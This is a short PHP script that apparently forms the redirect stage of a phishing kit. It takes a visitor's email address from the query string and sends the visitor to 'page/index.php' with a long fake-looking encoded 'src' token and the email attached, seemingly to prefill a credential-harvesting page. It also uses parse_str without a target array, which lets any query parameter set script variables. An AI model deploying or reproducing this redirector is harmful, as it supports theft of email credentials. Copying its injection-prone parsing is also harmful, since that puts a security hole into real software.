<?php 
	$path="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($path, PHP_URL_QUERY));

	$domain = explode('@', $email);
	
	$at_domain = '@'.strtolower($domain[1]);
	$param = "/index.php?src=DluZDluZHNmNDBlb2RzaDluZHNmNDDBlb2RzaTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbHNmNDBlb2RzaTRDluZHNmNDBlb2RzaTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbZWppZXdpb2U5NDluZHNmNDBlb2RzaTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpb25ja29uc2NrIGtjIGtqIHZqayBj&access=$email";
header('Location: page'.$param);
?>

